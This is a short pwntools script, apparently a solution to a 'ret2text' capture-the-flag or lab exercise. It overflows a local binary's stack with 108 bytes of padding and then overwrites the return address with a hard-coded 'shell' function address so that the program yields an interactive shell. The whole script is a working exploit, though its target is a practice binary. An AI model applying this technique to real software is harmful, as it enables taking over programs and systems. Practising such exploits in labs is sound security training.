from pwn import *


context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'sp' ,'-h']

io = process('./ret2text')
elf = ELF('./ret2text')

shell = 0x0804846b
padding = cyclic(108)
payload = padding + p32(shell)*10

gdb.attach(io)
io.send(payload)
io.interactive()

